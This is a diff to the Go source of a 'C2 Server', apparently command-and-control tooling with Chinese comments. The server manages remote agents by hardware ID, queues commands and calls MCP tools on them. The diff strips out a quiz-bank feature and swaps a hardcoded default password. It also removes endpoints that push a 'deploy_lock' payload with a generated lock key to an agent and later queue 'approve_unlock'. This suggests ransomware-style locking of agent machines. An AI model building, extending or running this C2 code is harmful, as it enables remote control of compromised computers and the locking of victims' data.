@@ -132,56 +132,6 @@ func (s *SessionManager) Validate(token string) bool {
 	return ok
 }
 
-// QuizManager handles quiz bank and scoring
-type QuizManager struct {
-	mu    sync.Mutex
-	bank  QuizBank
-	state map[string]*QuizState
-}
-
-type QuizBank struct {
-	MC        []QuizMC   `json:"mc"`
-	Input     []QuizInput `json:"input"`
-	PassScore float64    `json:"pass_score"`
-}
-
-type QuizMC struct {
-	Q    string   `json:"q"`
-	Opts []string `json:"opts"`
-	Ans  int      `json:"ans"`
-	Pts  int      `json:"pts"`
-}
-
-type QuizInput struct {
-	Q   string `json:"q"`
-	Ans string `json:"ans"`
-	Pts int    `json:"pts"`
-}
-
-type QuizState struct {
-	TotalRuns int       `json:"total_runs"`
-	UsedMC    []int     `json:"used_mc"`
-	UsedInp   []int     `json:"used_inp"`
-	Scores    []float64 `json:"scores"`
-}
-
-func NewQuizManager() *QuizManager {
-	return &QuizManager{state: make(map[string]*QuizState)}
-}
-
-func (q *QuizManager) LoadBank(path string) {
-	data, err := os.ReadFile(path)
-	if err != nil {
-		log.Printf("[Quiz] Bank not found: %s", path)
-		return
-	}
-	json.Unmarshal(data, &q.bank)
-	if q.bank.PassScore == 0 {
-		q.bank.PassScore = 70
-	}
-	log.Printf("[Quiz] Bank loaded: %d MC + %d Input", len(q.bank.MC), len(q.bank.Input))
-}
-
 // CommandQueue for agent commands
 type CommandQueue struct {
 	mu      sync.Mutex
@@ -244,14 +194,13 @@ func main() {
 	// 环境变量兜底
 	port := getEnvInt("C2_PORT", 8080)
 	user := getEnv("C2_USER", "admin")
-	pass := getEnv("C2_PASS", "c2admin2026")
-	quizPath := getEnv("C2_QUIZ", "quiz_bank.json")
+	pass := getEnv("C2_PASS", "changeme")
 
 	// 子命令派发
 	if len(os.Args) > 1 {
 		switch os.Args[1] {
 		case "serve":
-			runServer(port, user, pass, quizPath, os.Args[2:])
+			runServer(port, user, pass, os.Args[2:])
 			return
 		case "agent":
 			runAgentCmd(os.Args[2:])
@@ -268,7 +217,7 @@ func main() {
 		}
 	}
 	// 无参数默认 serve（兼容旧脚本）
-	runServer(port, user, pass, quizPath, nil)
+	runServer(port, user, pass, nil)
 }
 
 func getEnv(key, def string) string {
@@ -284,14 +233,14 @@ func getEnvInt(key string, def int) int {
 
 func printUsage() {
 	fmt.Println(`C2 Server - 命令行用法:
-  c2-server serve [--port N] [--user U] [--pass P] [--quiz FILE]  启动服务端
+  c2-server serve [--port N] [--user U] [--pass P]  启动服务端
   c2-server agent list                                              列出在线 Agent
   c2-server agent info <hwid>                                       查看 Agent 详情
   c2-server mcp call <hwid> <tool> <json-args>                      调用 MCP 工具（同步等待结果）
   c2-server version                                                 显示版本
   c2-server help                                                    显示帮助
 
-环境变量兜底: C2_PORT C2_USER C2_PASS C2_QUIZ
+环境变量兜底: C2_PORT C2_USER C2_PASS
 示例:
   c2-server serve --port 8080
   c2-server agent list
@@ -299,7 +248,7 @@ func printUsage() {
 `)
 }
 
-func runServer(port int, user, pass, quizPath string, extraArgs []string) {
+func runServer(port int, user, pass string, extraArgs []string) {
 	// 解析 serve 子命令的额外参数
 	for i := 0; i < len(extraArgs); i++ {
 		switch extraArgs[i] {
@@ -309,15 +258,11 @@ func runServer(port int, user, pass, quizPath string, extraArgs []string) {
 			if i+1 < len(extraArgs) { user = extraArgs[i+1]; i++ }
 		case "--pass":
 			if i+1 < len(extraArgs) { pass = extraArgs[i+1]; i++ }
-		case "--quiz":
-			if i+1 < len(extraArgs) { quizPath = extraArgs[i+1]; i++ }
 		}
 	}
 
 	agents := NewAgentRegistry()
 	sessions := NewSessionManager(user, pass)
-	quiz := NewQuizManager()
-	quiz.LoadBank(quizPath)
 	cmds := NewCommandQueue()
 
 	// ... 后面保持原有 HTTP 路由不变 ...
@@ -475,14 +420,6 @@ func runServer(port int, user, pass, quizPath string, extraArgs []string) {
 		}
 	})
 
-	// Quiz bank info
-	mux.HandleFunc("/api/quiz_bank", func(w http.ResponseWriter, r *http.Request) {
-		writeJSON(w, 200, map[string]interface{}{
-			"total_mc":  len(quiz.bank.MC),
-			"total_input": len(quiz.bank.Input),
-		})
-	})
-
 	// ═══ File Store path ═══
 	// 优先用环境变量，否则用可执行文件同级目录下的 filestore/
 	filestoreDir := func() string {
@@ -583,30 +520,6 @@ func runServer(port int, user, pass, quizPath string, extraArgs []string) {
 		w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(name))
 		w.Header().Set("Content-Length", strconv.FormatInt(info.Size(), 10))
 		http.ServeFile(w, r, path)
-	})
-
-	// Payload deploy
-	mux.HandleFunc("/api/payload", func(w http.ResponseWriter, r *http.Request) {
-		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
-		var body struct {
-			AgentHWID  string `json:"agent_hwid"`
-			ServerFile string `json:"server_file"`
-			Task       string `json:"task"`
-		}
-		json.NewDecoder(r.Body).Decode(&body)
-		lockKey := genKey(8)
-		cmdData, _ := json.Marshal(map[string]string{"file": body.ServerFile, "pass": lockKey, "hwid": body.AgentHWID})
-		cmds.Enqueue(body.AgentHWID, "deploy_lock", string(cmdData))
-		writeJSON(w, 200, map[string]interface{}{"ok": true, "lock_key": lockKey, "payload": body.ServerFile})
-	})
-
-	// Approve unlock
-	mux.HandleFunc("/api/lock_keys/approve", func(w http.ResponseWriter, r *http.Request) {
-		if !checkAuth(r, sessions) { writeJSON(w, 401, map[string]string{"error": "unauthorized"}); return }
-		var body struct{ HWID string `json:"hwid"` }
-		json.NewDecoder(r.Body).Decode(&body)
-		cmds.Enqueue(body.HWID, "approve_unlock", "{}")
-		writeJSON(w, 200, map[string]interface{}{"ok": true, "approved": true})
 	})
 
 	// ═══ File Store ═══
@@ -798,7 +711,7 @@ func runMcpCmd(args []string) {
 
 func login(base string) string {
 	user := getEnv("C2_USER", "admin")
-	pass := getEnv("C2_PASS", "c2admin2026")
+	pass := getEnv("C2_PASS", "changeme")
 	data, _ := json.Marshal(map[string]string{"user": user, "pass": pass})
 	req, _ := http.NewRequest("POST", base+"/api/login", bytes.NewReader(data))
 	req.Header.Set("Content-Type", "application/json")
